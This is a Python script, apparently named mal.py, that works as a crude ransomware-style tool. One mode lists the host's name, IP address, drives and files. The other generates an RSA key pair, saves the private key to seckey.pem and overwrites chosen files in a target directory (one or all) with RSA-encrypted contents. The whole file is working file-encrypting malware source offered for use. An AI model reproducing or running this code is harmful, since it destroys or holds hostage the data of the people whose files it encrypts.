import rsa
import os
import sys
import socket
import win32api

if int(len(sys.argv))>1:
	args=str(sys.argv[1])

if args=='mysystem':
	
	hostname = socket.gethostname()
	IPAddr = socket.gethostbyname(hostname)

	print("Your Computer Name is:" + hostname)
	print("Your Computer IP Address is:" + IPAddr)

	drives = win32api.GetLogicalDriveStrings()
	drives = drives.split('\000')[:-1]

	if len(sys.argv)==3:
		print()
		path=sys.argv[2]
		for i in os.listdir(path=path):
			print(i)
			
	else:
		print("#############available drives in system############")
		print(drives)
		for d in drives:
			print()
			print(f'materials in drive {d}')
			print()
			for i in os.listdir(path=d):
				print(i)

else:
	publicKey, privateKey = rsa.newkeys(512)

	paths='./'

	#write my key
	with open("seckey.pem","wb") as mykey:
		mykey.write(privateKey.save_pkcs1())

	files=[]

	if int(len(sys.argv))>1 and args=='current':
		for i in os.listdir():
			if i=='mal.py' or i=='seckey.pem' or i=='dec.py'or i=='reqs.txt':
				continue
			if os.path.isfile(i):
				files.append(i)
	else:
		paths=input("Enter target directory path address :")
		if not paths[(len(paths)-1)]=='/':
			paths=paths+'/'
		for i in os.listdir(paths):
			if i=='mal.py' or i=='seckey.pem' or i=='dec.py':
				continue
			if os.path.isfile(paths+str(i)):
				files.append(i)


	print("List OF Files...")
	print(files)

	print("##############To encrypt all files write all or for specefic one enter file name###############")
	user_input=input()

	if user_input!='all':
		with open(paths+str(user_input),"r") as targets:
				contents=targets.read()
		with open(paths+str(user_input),"wb") as target:
				target.write(rsa.encrypt(contents.encode(),publicKey))
		print("....................ENCRYPTED......................")

	elif files and user_input=='all':
		for i in files:
			with open(paths+str(i),"r") as targets:
				contents=targets.read()
			with open(paths+str(i),"wb") as target:
				target.write(rsa.encrypt(contents.encode(),publicKey))
		print("....................ENCRYPTED......................")

	else:
		print("#######----No Files")
